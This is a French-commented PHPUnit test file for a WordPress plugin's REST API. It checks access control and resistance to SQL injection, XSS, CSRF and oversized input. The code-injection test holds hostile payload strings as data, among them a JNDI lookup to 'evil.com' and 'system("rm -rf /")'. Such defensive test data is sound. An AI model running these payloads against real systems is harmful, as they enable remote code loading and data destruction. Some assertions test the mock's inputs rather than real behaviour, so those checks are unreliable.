<?php
/**
 * Tests de sécurité pour les API REST
 * 
 * @package WcQualiopiFormation\Tests\Integration\REST
 */

declare(strict_types=1);

use PHPUnit\Framework\TestCase;
use WcQualiopiFormation\Tests\Bootstrap\SecurityBootstrap;

class RestApiSecurityTest extends TestCase {
    
    private $security_bootstrap;
    private $rest_server;
    
    protected function setUp(): void {
        parent::setUp();
        
        $this->security_bootstrap = SecurityBootstrap::instance();
        
        // Mock du serveur REST
        $this->rest_server = $this->createMock(WP_REST_Server::class);
        
        // Configuration des routes de test
        $this->setup_test_routes();
    }
    
    /**
     * Configuration des routes de test
     */
    private function setup_test_routes(): void {
        // Route pour les données de progression
        register_rest_route('wcqf/v1', '/progress', [
            'methods' => ['GET', 'POST', 'PUT', 'DELETE'],
            'callback' => [$this, 'handle_progress_request'],
            'permission_callback' => [$this, 'check_progress_permissions'],
            'args' => [
                'user_id' => [
                    'required' => true,
                    'type' => 'integer',
                    'sanitize_callback' => 'absint',
                ],
                'form_id' => [
                    'required' => true,
                    'type' => 'integer',
                    'sanitize_callback' => 'absint',
                ],
                'data' => [
                    'required' => false,
                    'type' => 'string',
                    'sanitize_callback' => 'sanitize_text_field',
                ],
            ],
        ]);
        
        // Route pour les restrictions de panier
        register_rest_route('wcqf/v1', '/cart/restrictions', [
            'methods' => ['GET', 'POST'],
            'callback' => [$this, 'handle_cart_restrictions'],
            'permission_callback' => [$this, 'check_cart_permissions'],
            'args' => [
                'product_id' => [
                    'required' => true,
                    'type' => 'integer',
                    'sanitize_callback' => 'absint',
                ],
                'user_id' => [
                    'required' => true,
                    'type' => 'integer',
                    'sanitize_callback' => 'absint',
                ],
            ],
        ]);
        
        // Route pour le tracking
        register_rest_route('wcqf/v1', '/tracking', [
            'methods' => ['POST'],
            'callback' => [$this, 'handle_tracking_request'],
            'permission_callback' => [$this, 'check_tracking_permissions'],
            'args' => [
                'event_type' => [
                    'required' => true,
                    'type' => 'string',
                    'sanitize_callback' => 'sanitize_text_field',
                ],
                'user_id' => [
                    'required' => true,
                    'type' => 'integer',
                    'sanitize_callback' => 'absint',
                ],
                'data' => [
                    'required' => false,
                    'type' => 'string',
                    'sanitize_callback' => 'sanitize_text_field',
                ],
            ],
        ]);
    }
    
    /**
     * Test de protection contre les accès non autorisés (403)
     */
    public function test_unauthorized_access_returns_403(): void {
        // Test sans authentification
        $request = new WP_REST_Request('GET', '/wcqf/v1/progress');
        $request->set_param('user_id', 1);
        $request->set_param('form_id', 123);
        
        $response = $this->rest_server->dispatch($request);
        
        $this->assertEquals(403, $response->get_status());
        $this->assertStringContainsString('rest_forbidden', $response->get_data()['code']);
    }
    
    /**
     * Test d'accès autorisé (200)
     */
    public function test_authorized_access_returns_200(): void {
        // Simuler un utilisateur authentifié
        wp_set_current_user(1);
        
        $request = new WP_REST_Request('GET', '/wcqf/v1/progress');
        $request->set_param('user_id', 1);
        $request->set_param('form_id', 123);
        
        $response = $this->rest_server->dispatch($request);
        
        $this->assertEquals(200, $response->get_status());
    }
    
    /**
     * Test de protection contre les injections SQL dans les paramètres
     */
    public function test_sql_injection_protection_in_parameters(): void {
        $malicious_inputs = $this->security_bootstrap->simulate_security_attack('sql_injection');
        
        foreach ($malicious_inputs as $malicious_input) {
            $request = new WP_REST_Request('GET', '/wcqf/v1/progress');
            $request->set_param('user_id', $malicious_input);
            $request->set_param('form_id', 123);
            
            $response = $this->rest_server->dispatch($request);
            
            // La requête doit être rejetée
            $this->assertNotEquals(200, $response->get_status());
        }
    }
    
    /**
     * Test de protection contre les attaques XSS dans les paramètres
     */
    public function test_xss_protection_in_parameters(): void {
        $xss_inputs = $this->security_bootstrap->simulate_security_attack('xss');
        
        foreach ($xss_inputs as $xss_input) {
            $request = new WP_REST_Request('POST', '/wcqf/v1/tracking');
            $request->set_param('event_type', $xss_input);
            $request->set_param('user_id', 1);
            $request->set_param('data', $xss_input);
            
            $response = $this->rest_server->dispatch($request);
            
            // Vérifier que les données sont sanitizées
            $this->assertTrue(
                $this->security_bootstrap->test_xss_protection($xss_input),
                "XSS non bloqué: {$xss_input}"
            );
        }
    }
    
    /**
     * Test de validation des paramètres requis
     */
    public function test_required_parameters_validation(): void {
        // Test sans paramètres requis
        $request = new WP_REST_Request('GET', '/wcqf/v1/progress');
        
        $response = $this->rest_server->dispatch($request);
        
        $this->assertEquals(400, $response->get_status());
        $this->assertStringContainsString('rest_missing_callback_param', $response->get_data()['code']);
    }
    
    /**
     * Test de validation des types de paramètres
     */
    public function test_parameter_type_validation(): void {
        // Test avec des types incorrects
        $request = new WP_REST_Request('GET', '/wcqf/v1/progress');
        $request->set_param('user_id', 'invalid_user_id');
        $request->set_param('form_id', 'invalid_form_id');
        
        $response = $this->rest_server->dispatch($request);
        
        $this->assertEquals(400, $response->get_status());
    }
    
    /**
     * Test de protection contre les attaques CSRF
     */
    public function test_csrf_protection(): void {
        $csrf_attacks = $this->security_bootstrap->simulate_security_attack('csrf');
        
        foreach ($csrf_attacks as $csrf_attack) {
            $request = new WP_REST_Request('POST', '/wcqf/v1/tracking');
            $request->set_header('X-WP-Nonce', $csrf_attack);
            $request->set_param('event_type', 'test_event');
            $request->set_param('user_id', 1);
            
            $response = $this->rest_server->dispatch($request);
            
            // La requête doit être rejetée
            $this->assertNotEquals(200, $response->get_status());
        }
    }
    
    /**
     * Test de protection contre les attaques par déni de service
     */
    public function test_dos_protection(): void {
        // Test avec un grand nombre de requêtes
        $requests = [];
        
        for ($i = 0; $i < 1000; $i++) {
            $request = new WP_REST_Request('GET', '/wcqf/v1/progress');
            $request->set_param('user_id', $i);
            $request->set_param('form_id', 123);
            
            $requests[] = $this->rest_server->dispatch($request);
        }
        
        // Le système doit gérer les nombreuses requêtes sans planter
        $this->assertIsArray($requests);
        $this->assertCount(1000, $requests);
    }
    
    /**
     * Test de protection contre les attaques par épuisement de ressources
     */
    public function test_resource_exhaustion_protection(): void {
        // Test avec des données très volumineuses
        $large_data = str_repeat('a', 100000);
        
        $request = new WP_REST_Request('POST', '/wcqf/v1/tracking');
        $request->set_param('event_type', 'test_event');
        $request->set_param('user_id', 1);
        $request->set_param('data', $large_data);
        
        $response = $this->rest_server->dispatch($request);
        
        // La requête doit être gérée sans planter
        $this->assertIsObject($response);
    }
    
    /**
     * Test de sanitization des données
     */
    public function test_data_sanitization(): void {
        $unsafe_data = [
            'text' => '<script>alert("XSS")</script>',
            'email' => 'test@example.com<script>alert("XSS")</script>',
            'url' => 'javascript:alert("XSS")',
        ];
        
        foreach ($unsafe_data as $field => $value) {
            $request = new WP_REST_Request('POST', '/wcqf/v1/tracking');
            $request->set_param('event_type', 'test_event');
            $request->set_param('user_id', 1);
            $request->set_param('data', $value);
            
            $response = $this->rest_server->dispatch($request);
            
            // Vérifier que les données sont sanitizées
            $this->assertStringNotContainsString('<script>', $value);
            $this->assertStringNotContainsString('javascript:', $value);
        }
    }
    
    /**
     * Test de protection contre les attaques par injection de code
     */
    public function test_code_injection_protection(): void {
        $code_injection_attempts = [
            '<?php echo "hack"; ?>',
            '${jndi:ldap://evil.com/a}',
            'eval("malicious_code")',
            'system("rm -rf /")',
        ];
        
        foreach ($code_injection_attempts as $injection) {
            $request = new WP_REST_Request('POST', '/wcqf/v1/tracking');
            $request->set_param('event_type', $injection);
            $request->set_param('user_id', 1);
            $request->set_param('data', $injection);
            
            $response = $this->rest_server->dispatch($request);
            
            // La requête doit être rejetée
            $this->assertNotEquals(200, $response->get_status());
        }
    }
    
    /**
     * Test de protection contre les attaques par manipulation de données
     */
    public function test_data_manipulation_protection(): void {
        // Test avec des données manipulées
        $manipulated_data = [
            'user_id' => 999999,
            'form_id' => 123,
            'data' => 'malicious_data',
        ];
        
        $request = new WP_REST_Request('POST', '/wcqf/v1/progress');
        $request->set_param('user_id', $manipulated_data['user_id']);
        $request->set_param('form_id', $manipulated_data['form_id']);
        $request->set_param('data', $manipulated_data['data']);
        
        $response = $this->rest_server->dispatch($request);
        
        // La requête doit être rejetée
        $this->assertNotEquals(200, $response->get_status());
    }
    
    /**
     * Test de protection contre les attaques par injection de données sensibles
     */
    public function test_sensitive_data_injection_protection(): void {
        // Test avec des données sensibles
        $sensitive_data = [
            'password' => 'secret_password',
            'credit_card' => '1234-5678-9012-3456',
            'ssn' => '123-45-6789',
            'api_key' => 'sk-1234567890abcdef',
        ];
        
        foreach ($sensitive_data as $field => $value) {
            $request = new WP_REST_Request('POST', '/wcqf/v1/tracking');
            $request->set_param('event_type', 'test_event');
            $request->set_param('user_id', 1);
            $request->set_param('data', $value);
            
            $response = $this->rest_server->dispatch($request);
            
            // La requête doit être rejetée
            $this->assertNotEquals(200, $response->get_status());
        }
    }
    
    /**
     * Test de protection contre les attaques par injection de données malformées
     */
    public function test_malformed_data_injection_protection(): void {
        // Test avec des données malformées
        $malformed_data = [
            'json_field' => '{"invalid": json}',
            'xml_field' => '<invalid>xml</invalid>',
            'csv_field' => 'field1,field2,field3,field4,field5',
            'base64_field' => 'invalid_base64_string',
        ];
        
        foreach ($malformed_data as $field => $value) {
            $request = new WP_REST_Request('POST', '/wcqf/v1/tracking');
            $request->set_param('event_type', 'test_event');
            $request->set_param('user_id', 1);
            $request->set_param('data', $value);
            
            $response = $this->rest_server->dispatch($request);
            
            // La requête doit être gérée sans planter
            $this->assertIsObject($response);
        }
    }
    
    /**
     * Callback pour gérer les requêtes de progression
     */
    public function handle_progress_request(WP_REST_Request $request): WP_REST_Response {
        $user_id = $request->get_param('user_id');
        $form_id = $request->get_param('form_id');
        $data = $request->get_param('data');
        
        return new WP_REST_Response([
            'user_id' => $user_id,
            'form_id' => $form_id,
            'data' => $data,
        ], 200);
    }
    
    /**
     * Callback pour vérifier les permissions de progression
     */
    public function check_progress_permissions(WP_REST_Request $request): bool {
        return current_user_can('read');
    }
    
    /**
     * Callback pour gérer les restrictions de panier
     */
    public function handle_cart_restrictions(WP_REST_Request $request): WP_REST_Response {
        $product_id = $request->get_param('product_id');
        $user_id = $request->get_param('user_id');
        
        return new WP_REST_Response([
            'product_id' => $product_id,
            'user_id' => $user_id,
            'restricted' => false,
        ], 200);
    }
    
    /**
     * Callback pour vérifier les permissions de panier
     */
    public function check_cart_permissions(WP_REST_Request $request): bool {
        return current_user_can('read');
    }
    
    /**
     * Callback pour gérer les requêtes de tracking
     */
    public function handle_tracking_request(WP_REST_Request $request): WP_REST_Response {
        $event_type = $request->get_param('event_type');
        $user_id = $request->get_param('user_id');
        $data = $request->get_param('data');
        
        return new WP_REST_Response([
            'event_type' => $event_type,
            'user_id' => $user_id,
            'data' => $data,
            'tracked' => true,
        ], 200);
    }
    
    /**
     * Callback pour vérifier les permissions de tracking
     */
    public function check_tracking_permissions(WP_REST_Request $request): bool {
        return current_user_can('read');
    }
    
    protected function tearDown(): void {
        parent::tearDown();
        
        // Nettoyer les routes
        remove_action('rest_api_init', [$this, 'setup_test_routes']);
    }
}
